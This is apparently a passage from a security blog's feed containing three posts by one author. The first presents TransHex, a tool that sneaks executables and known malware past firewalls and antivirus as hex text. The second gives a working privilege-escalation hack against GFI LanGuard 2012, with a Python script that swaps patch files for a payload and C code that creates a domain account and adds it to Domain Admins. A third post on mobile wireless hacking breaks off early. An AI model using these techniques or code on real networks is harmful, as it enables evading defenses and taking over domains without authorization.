  &lt;li&gt;Tested through multiple nexgen firewalls and proxies&lt;/li&gt;
  &lt;li&gt;Must have python loaded on the client machine or&lt;/li&gt;
  &lt;li&gt;Transfer the client as an exe to the client by other means&lt;/li&gt;
  &lt;li&gt;Tested on Kali Linux (3.7-trunk-686-pae #1 AMP Debian 3.7.0.2-0+kali5 i686 GNU/Linux)&lt;/li&gt;
  &lt;li&gt;The server application is NOT meant to be secure!  You must wrap your own security around the application&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;installation-on-fresh-install-of-kali-linux&quot;&gt;Installation (on Fresh install of Kali Linux)&lt;/h2&gt;

&lt;h3 id=&quot;server-side&quot;&gt;SERVER SIDE&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;Download the TransHex package from here (MD5:A38EB881A4708FD474D858680648E611 SHA1:10E0066CEF1B95CF77498347D21DFCBB15CA7D5F)&lt;/li&gt;
  &lt;li&gt;Extract the files from the package&lt;/li&gt;
  &lt;li&gt;Delete /var/www/index.html&lt;/li&gt;
  &lt;li&gt;Copy contents of the Server folder from the package to /var/www/&lt;/li&gt;
  &lt;li&gt;Ensure permissions are correct on the files (again this is NOT a secure app)
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;chmod 755 TransHex_BIN_to_TXT.py
chmod 644 index.php
chmod 644 getfile.php
chmod 777 hex
service apache2 start
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Go to http://127.0.0.1 and the page should now be live&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;client-side&quot;&gt;CLIENT SIDE&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;Somehow get the file TransHex_TXT_to_BIN.py to a client on the inside of the network (needs python installed)&lt;/li&gt;
  &lt;li&gt;OR convert the file TransHex_TXT_to_BIN.py to a PE and get it to a client on the inside of the network&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;usage&quot;&gt;Usage&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;Locate the URL of the exe that you wish to download (also works with archive files)&lt;/li&gt;
  &lt;li&gt;From the client on the inside of the network open a browser and go to your server, hopefully the URL isn’t blocked&lt;/li&gt;
  &lt;li&gt;Enter the URL of the exe into the text field and click “Go Get It!”&lt;/li&gt;
  &lt;li&gt;Wait for the page to load.  There is no progress bar and with large files or slow connections PHP settings may have to be changed on the server&lt;/li&gt;
  &lt;li&gt;Once the page loads click “continue …”&lt;/li&gt;
  &lt;li&gt;You will now see your text file in the list&lt;/li&gt;
  &lt;li&gt;Right click the hyperlink of the text file and select “Save Link As…”&lt;/li&gt;
  &lt;li&gt;Save the text file to the same location that the TransHex_TXT_to_BIN.py file is&lt;/li&gt;
  &lt;li&gt;Open a command shell on the client&lt;/li&gt;
  &lt;li&gt;Navigate to the path were TransHex_TXT_to_BIN.py is located&lt;/li&gt;
  &lt;li&gt;Run – python TransHex_TXT_to_BIN.py [text file name] [new binary file name]&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;Based on a very simple idea TransHex is able to defeat very sophisticated technology.  It is obviously limited to being able to get the client into the internal network and being able to execute it.&lt;/p&gt;

&lt;p&gt;This trick has worked since I started using it back about 5 or 6 years ago and continues to work today.  Edge technology may never be able to pick up on this as signatures would have to be made for ASCII text and compared to binary signatures or some other means would have to be created.  So have fun with it and as always don’t be stupid and break the law.&lt;/p&gt;

&lt;h2 id=&quot;images&quot;&gt;Images&lt;/h2&gt;
&lt;p&gt;Installation Permissions&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/transhex/www_perm.png&quot; alt=&quot;alt text&quot; title=&quot;permissions&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Main Server Page&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/transhex/server.png&quot; alt=&quot;alt text&quot; title=&quot;server&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Usage Images&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/transhex/usage_01.png&quot; alt=&quot;alt text&quot; title=&quot;usage 01&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/transhex/usage_02.png&quot; alt=&quot;alt text&quot; title=&quot;usage 02&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/transhex/usage_03.png&quot; alt=&quot;alt text&quot; title=&quot;usage 03&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/transhex/usage_04.png&quot; alt=&quot;alt text&quot; title=&quot;usage 04&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/transhex/usage_05.png&quot; alt=&quot;alt text&quot; title=&quot;usage 05&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;files&quot;&gt;Files&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/RabbidByte/TransHex&quot;&gt;https://github.com/RabbidByte/TransHex&lt;/a&gt;&lt;/p&gt;</content><author><name>RabbidByte</name></author><summary type="html">Summary We have all faced the problem of transferring “malicious” or binary files through corporate firewalls or proxies when doing penetration tests. Previously the work around was quite easy. FTP, SSL, and SSH tunneling (the list goes on) provided a quick and easy way to bring whatever tools a penetration tester needed into the environment. Edge technologies have now matured and these simple techniques are no longer working mainly due to next generation firewalls with application ID. So how do you get around this? Go old school to beat new school tech! The general idea we had before writing the very rough first release of TransHex was AV does not scan hex in text files. So how to beat the application ID portion of the nexgen firewalls? Easy, you don’t. We initially wrote the program completely in python as a client server app and we were quickly blocked by nexgen firewalls. So if you can’t beat them, join them. The app was ported to a web server and bingo bango we were transferring files through multiple nexgen firewalls without being detected. So here is a quick breakdown on how TransHex works. The attacker/pentester goes to the web app that would be loaded on a public server The attacker/pentester requests an exe that is available on a different publicly available server and submits to the application TransHex at this point downloads the exe and saves it to [web path]/hex/[filename] Once the download is complete a python script is ran that converts the binary file to a single hex string The hex string is written to a new text file in [web path]/hex/[filename] The attacker/pentester then goes back to the main page of the application by clicking continue The new text file is now listed on the first page The attacker/pentester then saves the text file to the local machine using the internet browser On the local machine the attacker/pentester converts the text file with the hex string to a binary using the python client script Application Notes This application is provided as is. NO support is offered for this application and only you are liable for any damage this application may cause. Features that need to be added Error handling Help/man pages Request hex conversion of local (server side) executables Hex string obfuscation Limitations and Testing Max file size tested with 115KB File types tested Zip and exe, windows files and known malware Tested through multiple nexgen firewalls and proxies Must have python loaded on the client machine or Transfer the client as an exe to the client by other means Tested on Kali Linux (3.7-trunk-686-pae #1 AMP Debian 3.7.0.2-0+kali5 i686 GNU/Linux) The server application is NOT meant to be secure! You must wrap your own security around the application Installation (on Fresh install of Kali Linux) SERVER SIDE Download the TransHex package from here (MD5:A38EB881A4708FD474D858680648E611 SHA1:10E0066CEF1B95CF77498347D21DFCBB15CA7D5F) Extract the files from the package Delete /var/www/index.html Copy contents of the Server folder from the package to /var/www/ Ensure permissions are correct on the files (again this is NOT a secure app) chmod 755 TransHex_BIN_to_TXT.py chmod 644 index.php chmod 644 getfile.php chmod 777 hex service apache2 start Go to http://127.0.0.1 and the page should now be live CLIENT SIDE Somehow get the file TransHex_TXT_to_BIN.py to a client on the inside of the network (needs python installed) OR convert the file TransHex_TXT_to_BIN.py to a PE and get it to a client on the inside of the network Usage Locate the URL of the exe that you wish to download (also works with archive files) From the client on the inside of the network open a browser and go to your server, hopefully the URL isn’t blocked Enter the URL of the exe into the text field and click “Go Get It!” Wait for the page to load. There is no progress bar and with large files or slow connections PHP settings may have to be changed on the server Once the page loads click “continue …” You will now see your text file in the list Right click the hyperlink of the text file and select “Save Link As…” Save the text file to the same location that the TransHex_TXT_to_BIN.py file is Open a command shell on the client Navigate to the path were TransHex_TXT_to_BIN.py is located Run – python TransHex_TXT_to_BIN.py [text file name] [new binary file name] Conclusion Based on a very simple idea TransHex is able to defeat very sophisticated technology. It is obviously limited to being able to get the client into the internal network and being able to execute it. This trick has worked since I started using it back about 5 or 6 years ago and continues to work today. Edge technology may never be able to pick up on this as signatures would have to be made for ASCII text and compared to binary signatures or some other means would have to be created. So have fun with it and as always don’t be stupid and break the law. Images Installation Permissions Main Server Page Usage Images Files https://github.com/RabbidByte/TransHex</summary></entry><entry><title type="html">GFI LanGuard 2012 Priviledge Escalation</title><link href="http://192.168.1.30:4000/GFI-LanGuard-2012-Priviledge-Escalation.html" rel="alternate" type="text/html" title="GFI LanGuard 2012 Priviledge Escalation" /><published>2013-02-05T00:00:00-07:00</published><updated>2013-02-05T00:00:00-07:00</updated><id>http://192.168.1.30:4000/GFI-LanGuard-2012-Priviledge-Escalation</id><content type="html" xml:base="http://192.168.1.30:4000/GFI-LanGuard-2012-Priviledge-Escalation.html">&lt;h2 id=&quot;download&quot;&gt;Download&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/RabbidByte/GFI2012-PrivilegeEscalation&quot;&gt;https://github.com/RabbidByte/GFI2012-PrivilegeEscalation&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;what-is-gfi-languard-2012&quot;&gt;What is GFI LanGuard 2012?&lt;/h2&gt;
&lt;p&gt;GFI LanGuard 2012 &lt;a href=&quot;http://www.gfi.com/network-security-vulnerability-scanner&quot;&gt;http://www.gfi.com/network-security-vulnerability-scanner&lt;/a&gt; is a software package that competes with Microsoft SCCM. This software is placed in a network environment to inventory hardware, software, perform basic vulnerability assessment, and manage the software packages on the computers within the network. At the time of writing this article the current version in 2012.&lt;/p&gt;

&lt;p&gt;LanGuard is actually quite a nice product. Sure it does have some issues like the amount of bandwidth required between sites, but all in all it gives an administrator great insight into what is actually out on their network. However we all know that not all administrators are created equally.&lt;/p&gt;

&lt;p&gt;In order for this hack to work an admin is required to implement a poor configuration. Luckily for you GFI provides absolutely no training for this product and there were no other third party training programs found either. So that basically leaves your admin to read the PDF’s supplied by GFI at &lt;a href=&quot;http://www.gfi.com/network-security-vulnerability-scanner/manual&quot;&gt;http://www.gfi.com/network-security-vulnerability-scanner/manual&lt;/a&gt; Now ask yourself, would your admin read these? Probably not because the software is so intuitive that installation and roll out is really point and click.&lt;/p&gt;

&lt;h2 id=&quot;how-it-works&quot;&gt;How it works&lt;/h2&gt;
&lt;p&gt;LanGuard has a very handy feature called auto remediation. This feature will push updates approved by the administrator to the machines out in the network. When the process begins the updated packages are copied to the local machine and then executed. The patches are installed and the user can be sent a prompt to restart the machine.&lt;/p&gt;

&lt;p&gt;When we first started looking at a way to hack this process we had no idea it would be so simple. There is absolutely no integrity check on the files before they are executed. So really what is to stop someone from changing the contents of the files before they are executed? Nothing. However GFI copies the files into the folder C:\Windows\Patches which has local security policies on it. This is the reason why local administrator privileges are required.&lt;/p&gt;

&lt;p&gt;Once you alter the files and the GFI process has copied all patches to the machine an on the fly batch file is created and the files are executed. So don’t change the file name or it won’t get run.&lt;/p&gt;

&lt;p&gt;Here is what we did to inject our own file content. First a listener program is launched to monitor the contents of the Patches directory. Once it sees that there are two files in the directory (meaning one has been written and the second is probably still being written to and locked) it will overwrite the first file with the payload file.&lt;/p&gt;

&lt;p&gt;The payload file in this example is really nothing special. Hell this whole hack is not special … we had such high hopes for it too. Either way the executable adds an AD account and gives it some nice domain permissions. Once it is run … try out your new account.&lt;/p&gt;

&lt;h2 id=&quot;requirements-for-hack-to-be-successful&quot;&gt;Requirements for Hack to be Successful&lt;/h2&gt;
&lt;p&gt;As previously mentioned there are some settings and requirements needed for this hack to work. So here they are.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Attacker must have local admin on a windows box that is joined to the same domain as GFI. This is really not hard to get. If you don’t know how to get local admin just check Google.&lt;/li&gt;
  &lt;li&gt;The administrator MUST have configured a Domain Account in the Auto Remediation Settings. The hack will be able to elevate privileges to the level of this account.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/gfi/Login.png&quot; alt=&quot;alt text&quot; title=&quot;Login&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;the-files&quot;&gt;The Files&lt;/h2&gt;
&lt;p&gt;listener.py&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;'''
Created on Dec 21, 2012
@author: RabbidByte (previously Essential Exploit Labs)
'''&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shutil&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Windows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Patches&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;payload.exe&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;hook&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;files&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;dirList&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;listdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fname&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dirList&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;fileToDelete&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;fileToDelete&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fname&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remove&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fileToDelete&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hook&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;dirList&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;dirList&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;listdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fname&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dirList&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endswith&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;.exe&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fname&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;files&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;We got the Files &quot;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;and &quot;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Time to launch payload!&quot;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;hook&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;fReplace&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fReplace&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;shutil&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;copy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fReplace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;payload.c&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// payload.cpp &lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// RabbidByte (previously Essential Exploit Labs)&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;#include &quot;stdafx.h&quot;
#include &amp;lt;Windows.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;net user admlnlstrator MyPassw0rd /add /domain&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;net group &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Domain Admins&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; admlnlstrator /add /domain&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;_tmain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_TCHAR&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;notes&quot;&gt;NOTES&lt;/h2&gt;
&lt;ol&gt;
  &lt;li&gt;Due to the special requirements needed for this to work we have labeled it as a hack and not an exploit.&lt;/li&gt;
  &lt;li&gt;Many networks have systems that alert admins when powerful AD accounts are created. You will probably get busted if you try to use this the way it is.&lt;/li&gt;
  &lt;li&gt;As always the author of this article is not responsible for how you use this information.&lt;/li&gt;
&lt;/ol&gt;</content><author><name>RabbidByte</name></author><summary type="html">Download https://github.com/RabbidByte/GFI2012-PrivilegeEscalation What is GFI LanGuard 2012? GFI LanGuard 2012 http://www.gfi.com/network-security-vulnerability-scanner is a software package that competes with Microsoft SCCM. This software is placed in a network environment to inventory hardware, software, perform basic vulnerability assessment, and manage the software packages on the computers within the network. At the time of writing this article the current version in 2012. LanGuard is actually quite a nice product. Sure it does have some issues like the amount of bandwidth required between sites, but all in all it gives an administrator great insight into what is actually out on their network. However we all know that not all administrators are created equally. In order for this hack to work an admin is required to implement a poor configuration. Luckily for you GFI provides absolutely no training for this product and there were no other third party training programs found either. So that basically leaves your admin to read the PDF’s supplied by GFI at http://www.gfi.com/network-security-vulnerability-scanner/manual Now ask yourself, would your admin read these? Probably not because the software is so intuitive that installation and roll out is really point and click. How it works LanGuard has a very handy feature called auto remediation. This feature will push updates approved by the administrator to the machines out in the network. When the process begins the updated packages are copied to the local machine and then executed. The patches are installed and the user can be sent a prompt to restart the machine. When we first started looking at a way to hack this process we had no idea it would be so simple. There is absolutely no integrity check on the files before they are executed. So really what is to stop someone from changing the contents of the files before they are executed? Nothing. However GFI copies the files into the folder C:\Windows\Patches which has local security policies on it. This is the reason why local administrator privileges are required. Once you alter the files and the GFI process has copied all patches to the machine an on the fly batch file is created and the files are executed. So don’t change the file name or it won’t get run. Here is what we did to inject our own file content. First a listener program is launched to monitor the contents of the Patches directory. Once it sees that there are two files in the directory (meaning one has been written and the second is probably still being written to and locked) it will overwrite the first file with the payload file. The payload file in this example is really nothing special. Hell this whole hack is not special … we had such high hopes for it too. Either way the executable adds an AD account and gives it some nice domain permissions. Once it is run … try out your new account. Requirements for Hack to be Successful As previously mentioned there are some settings and requirements needed for this hack to work. So here they are. Attacker must have local admin on a windows box that is joined to the same domain as GFI. This is really not hard to get. If you don’t know how to get local admin just check Google. The administrator MUST have configured a Domain Account in the Auto Remediation Settings. The hack will be able to elevate privileges to the level of this account. The Files listener.py ''' Created on Dec 21, 2012 @author: RabbidByte (previously Essential Exploit Labs) ''' import os, shutil path=&quot;C:\\Windows\\Patches\\&quot; payload=&quot;payload.exe&quot; hook=0 files = [] dirList=os.listdir(path) for fname in dirList: fileToDelete = path fileToDelete += fname os.remove(fileToDelete) fname = None while hook==0: dirList = None dirList=os.listdir(path) for fname in dirList: if fname.endswith(&quot;.exe&quot;): if fname not in (files): files.append(fname) if len(files) &amp;gt; 1: print &quot;We got the Files &quot; print files[0] print &quot;and &quot; print files[1] print &quot;Time to launch payload!&quot; hook=1 fReplace = path fReplace += files[0] shutil.copy(payload, fReplace) payload.c // payload.cpp // RabbidByte (previously Essential Exploit Labs) #include &quot;stdafx.h&quot; #include &amp;lt;Windows.h&amp;gt; void exploit() { system(&quot;net user admlnlstrator MyPassw0rd /add /domain&quot;); system(&quot;net group \&quot;Domain Admins\&quot; admlnlstrator /add /domain&quot;); } int _tmain(int argc, _TCHAR* argv[]) { exploit(); return 0; } NOTES Due to the special requirements needed for this to work we have labeled it as a hack and not an exploit. Many networks have systems that alert admins when powerful AD accounts are created. You will probably get busted if you try to use this the way it is. As always the author of this article is not responsible for how you use this information.</summary></entry><entry><title type="html">Mobile Hacking</title><link href="http://192.168.1.30:4000/Mobile-Hacking.html" rel="alternate" type="text/html" title="Mobile Hacking" /><published>2012-05-16T01:00:00-06:00</published><updated>2012-05-16T01:00:00-06:00</updated><id>http://192.168.1.30:4000/Mobile-Hacking</id><content type="html" xml:base="http://192.168.1.30:4000/Mobile-Hacking.html">&lt;p&gt;I have always loved wireless security.  It is just such an easy target.  The only issue that I have had is that I was restricted to carrying around a laptop and I just didn’t like the idea of having to operate the software while I was out.  So I came up with this neat little COMPLETELY mobile wireless hacking/trap solution.  Here is what you will need.&lt;/p&gt;

&lt;h2 id=&quot;equipment&quot;&gt;Equipment&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;an Alix board, CF, and enclosure&lt;/li&gt;
  &lt;li&gt;two ALPHA USB Wireless cards&lt;/li&gt;
  &lt;li&gt;a cell phone that you can tether to&lt;/li&gt;
  &lt;li&gt;mobile power solution&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;notes&quot;&gt;NOTES&lt;/h2&gt;

&lt;p&gt;I have written this very quickly and this may not be entirely accurate.  Although the tests that I have done did work this post has been put together using loose notes that I made through my testing.  I may (one day) return to this and tidy it up and add more detail, however I set out to do what I wanted and I wish to move on to newer projects.&lt;/p&gt;

&lt;h2 id=&quot;instructions&quot;&gt;Instructions&lt;/h2&gt;
&lt;ol&gt;
  &lt;li&gt;To start build your Alix system.  I built mine with Debian and I found a GREAT tutorial on how to get it loaded on a CF for your Alix board here -&amp;gt; http://www.youtube.com/watch?v=6VPsgR4pMik  Install the most basic packages to to run the system, we will add the other stuff later.&lt;/li&gt;
